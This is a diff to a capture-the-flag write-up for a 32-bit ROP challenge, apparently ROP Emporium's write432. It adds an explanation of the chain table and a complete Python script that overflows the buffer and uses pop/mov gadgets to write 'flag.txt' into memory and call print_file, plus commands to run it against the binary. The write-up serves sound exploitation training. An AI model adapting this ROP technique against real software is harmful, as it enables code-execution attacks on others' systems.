@@ -117,7 +117,7 @@ In the following table, the important addresses for constructing the ROP chain a
 | pop2registers | Gadget          | 0x080485aa | pop edi; pop ebp; ret;                                            |
 | mov2memory    | Gadget          | 0x08048543 | mov dword ptr [edi], ebp; ret;                                    |
 
-And the table describes the ROP chain itself:
+And the next table describes the ROP chain itself:
 
 | No | Chain Link                             |
 |----|----------------------------------------|
@@ -128,3 +128,48 @@ And the table describes the ROP chain itself:
 | 5  | mov2memory                             |
 | 6  | print_file, "XXXX", memory4string      |
 
+Where `"XXXX"` is the return address from the `print_file` function, which is not needed at all (it's there just to ensure that the parameter `memory4string` is in the right place on the stack).
+
+All that remains is to build the Python script that creates the ROP chain, and we’re done!
+
+```python
+# chain_builder.py
+import struct
+
+def little_endian(number):
+    """
+    : The function accepts a number not
+    : exceeding 4 bytes in size and returns it
+    : as a string of hexadecimal characters in : little-endian format.
+    """
+    return struct.pack("<I", number)
+
+# Parts of the chain
+fill_buffer  = b"X"*44
+
+print_file          = little_endian(0x080483d0)
+
+memory4string_part1 = little_endian(0x0804a018)
+memory4string_part2 = little_endian(0x0804a018+4) # That's fine because the addition does not create a null byte.
+
+pop2registers       = little_endian(0x080485aa)
+mov2memory          = little_endian(0x08048543)
+
+# Building the chain
+ROP_Chain = fill_buffer
+ROP_Chain += pop2registers + memory4string_part1 + b"flag"
+ROP_Chain += mov2memory
+ROP_Chain += pop2registers + memory4string_part2 + b".txt"
+ROP_Chain += mov2memory
+ROP_Chain += print_file + b"XXXX" + memory4string_part1
+
+# Saving the chain in a binary file
+with open("rop_chain", "wb") as f:
+    f.write(ROP_Chain)
+```
+```
+python3 chain_builder.py
+```
+```
+cat rop_chain | ./write432
+```
